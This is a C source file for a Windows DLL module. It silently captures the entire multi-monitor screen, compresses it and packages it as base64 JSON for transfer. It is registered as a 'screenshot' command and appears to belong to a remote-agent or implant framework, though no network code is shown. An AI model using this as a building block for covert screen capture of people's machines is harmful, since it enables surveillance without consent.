// cl.exe /LD screenshot.c zlib-1.3.1/*.c cJSON/cJSON.c /Fo.\obj\ /O2 /Ot /GL
// cl.exe /LD -DDEBUG screenshot.c zlib-1.3.1/*.c cJSON/cJSON.c /Fo.\obj\ /O2 /Ot /GL

// Python script for testing
/*
import zlib
import json
import base64

def bmp():
    with open("D:\\bitmap.json", "rb") as f:
        data = f.read()
    d = json.loads(data)
    with open("D:\\bitmap.bmp", "wb") as f:
        f.write(zlib.decompress(base64.b64decode(d["buffers"][0]['data'])))
    
*/

#include <stdio.h>
#include "common.h"
#include "zlib/zlib.h"

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")

unsigned char* CompressData(unsigned char* data, unsigned long dataSize, unsigned long* compressedSize);
void TakeScreenShot(DataBlobs* dbData);

Command main_cmd;

#ifdef DEBUG
__declspec(dllexport) void MainExport(void)
{
    DataBlobs *screenshots = (DataBlobs*)malloc(sizeof(DataBlobs));
    screenshots->buffers = NULL;
    screenshots->sizes = NULL;
    screenshots->count = 0;

    //Fill `screenshots` DataBlob with all screen data, compressed.
    TakeScreenShot(screenshots);

    //Convert compressed screenshot into base64'd JSON for transfer
    char* data = BlobsToJson(screenshots);

    FILE *fd = fopen("D:\\bitmap.json", "wb");
    //fwrite(screenshots->buffers[0], 1, (*(BITMAPFILEHEADER*)(screenshots->buffers[0])).bfSize, fd);
    fwrite(data, 1, strlen(data), fd);
    fflush(fd);
    fclose(fd);
}

__declspec(dllexport) void TestModuleCommand(void) {
    // LinkedList test
    struct Node* head = NULL;
    
    strcpy(main_cmd.command, "screenshot");
    main_cmd.command_func = MainExport;

    insertAtEnd(&head, main_cmd);

    head->data.command_func();
}
#endif

void TakeScreenShot(DataBlobs* dbData) {
    HDC              hdc     = NULL;
    unsigned long*   bmpFile = NULL;
    BITMAPFILEHEADER bmpFileHeader;
    BITMAPINFO       bmpInfo;
    SecureZeroMemory(&bmpInfo, sizeof(BITMAPINFO));

    // If there are multiple monitors on the system, calling CreateDC(TEXT("DISPLAY"),NULL,NULL,NULL) will create a DC covering all the monitors.
    HDC hScreenDC = CreateDC(TEXT("DISPLAY"), NULL, NULL, NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);

    // The width and height of the virtual screen, in pixels. The virtual screen is the bounding rectangle of all display monitors.
    // The SM_XVIRTUALSCREEN metric is the coordinates for the left side of the virtual screen. 
    int width  = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    // The SM_YVIRTUALSCREEN metric is the coordinates for the top of the virtual screen. 
    int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    // BEGIN: Copy color data into an in-memory bitmap
    HBITMAP hBitmap    = CreateCompatibleBitmap(hScreenDC, width, height);
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);

    BitBlt(hMemoryDC,   // A handle to the destination device context.
           0,           // The x-coordinate, in logical units, of the upper-left corner of the destination rectangle.
           0,           // The y-coordinate, in logical units, of the upper-left corner of the destination rectangle.
           width,       // The width, in logical units, of the source and destination rectangles.
           height,      // The height, in logical units, of the source and the destination rectangles.
           hScreenDC,   // A handle to the source device context.
           GetSystemMetrics(SM_XVIRTUALSCREEN), // The x-coordinate, in logical units, of the upper-left corner of the source rectangle.
           GetSystemMetrics(SM_YVIRTUALSCREEN), // The y-coordinate, in logical units, of the upper-left corner of the source rectangle.
           SRCCOPY      // A raster-operation code
    );
    
    hBitmap = (HBITMAP)SelectObject(hMemoryDC, hOldBitmap);
    // END: Copy color data into an in-memory bitmap

    // The below lines create a bitmap, in three parts:Bitmap File Header + Bitmap Info + Bitmap Image bytes
    hdc = GetDC(NULL);

    bmpInfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    // This will pass the dimensions and format of the bitmap `hBitmap` to the BITMAPINFO structure `bmpInfo`
    GetDIBits(hdc, hBitmap, 0, 0, NULL, &bmpInfo, DIB_RGB_COLORS);
    
    // Set the header manually. This allows us to reduce filesize by setting biBitCount to 16 instead of 32
    // bmpInfo.bmiHeader.biWidth = width;
    // bmpInfo.bmiHeader.biHeight = -height;  // Negative to indicate a top-down DIB
    // bmpInfo.bmiHeader.biPlanes = 1;
    bmpInfo.bmiHeader.biBitCount = 16;
    bmpInfo.bmiHeader.biSizeImage = bmpInfo.bmiHeader.biWidth*abs(bmpInfo.bmiHeader.biHeight)*(bmpInfo.bmiHeader.biBitCount) / 8;
    // bmpInfo.bmiHeader.biXPelsPerMeter = 0;
    // bmpInfo.bmiHeader.biYPelsPerMeter = 0;
    // bmpInfo.bmiHeader.biClrUsed = 0;
    // bmpInfo.bmiHeader.biClrImportant = 0;
    bmpInfo.bmiHeader.biCompression = BI_RGB;


    bmpFileHeader.bfReserved1 = 0;
    bmpFileHeader.bfReserved2 = 0;
    bmpFileHeader.bfSize      = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + bmpInfo.bmiHeader.biSizeImage;
    bmpFileHeader.bfType      = 'MB';
    bmpFileHeader.bfOffBits   = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    // Allocate space for the bitmap file in memory
    if ((bmpFile = calloc(1, bmpFileHeader.bfSize)) != NULL) {
        GetDIBits(hdc,                          // Handle to device context
                  hBitmap,                      // Handle to bitmap
                  0,                            // First scan line to retrieve
                  bmpInfo.bmiHeader.biHeight,   // Number of scan lines to retrieve
                  (char*)bmpFile+bmpFileHeader.bfOffBits, // [out] Pointer to buffer to receive bitmap data
                  &bmpInfo,                     // [in, out] A pointer to a BITMAPINFO structure that specifies the desired format for the DIB data.
                  DIB_RGB_COLORS                // The format of the bmiColors member of the BITMAPINFO structure.
        );
        memcpy(bmpFile, &bmpFileHeader, sizeof(BITMAPFILEHEADER));
        memcpy((char*)bmpFile + sizeof(BITMAPFILEHEADER), &bmpInfo.bmiHeader, sizeof(BITMAPINFOHEADER));
    }

    // Clean-up
    if (hMemoryDC) { DeleteDC(hMemoryDC); }
    if (hScreenDC) { DeleteDC(hScreenDC); }
    if (hdc) { ReleaseDC(NULL, hdc); }

    //Compress
    unsigned long compressedSize;
    unsigned char* compressedData = CompressData((unsigned char*)bmpFile, (*(BITMAPFILEHEADER*)(bmpFile)).bfSize, &compressedSize);

    if (bmpFile) {free(bmpFile); }

    dbData->buffers = (unsigned char**)realloc(dbData->buffers, (dbData->count + 1) * sizeof(unsigned char*));
    dbData->sizes = (unsigned long*)realloc(dbData->sizes, (dbData->count + 1) * sizeof(unsigned long));

    dbData->buffers[dbData->count] = compressedData;
    dbData->sizes[dbData->count] = compressedSize;
    dbData->count++;
}

unsigned char* CompressData(unsigned char* data, unsigned long dataSize, unsigned long* compressedSize)
{
    uLongf destLen = compressBound(dataSize);
    unsigned char* compressedData = (unsigned char*)malloc(destLen);

    if (compress(compressedData, &destLen, data, dataSize) != Z_OK) {
        free(compressedData);
        return NULL;
    }

    *compressedSize = (unsigned long)destLen;
    return compressedData;
}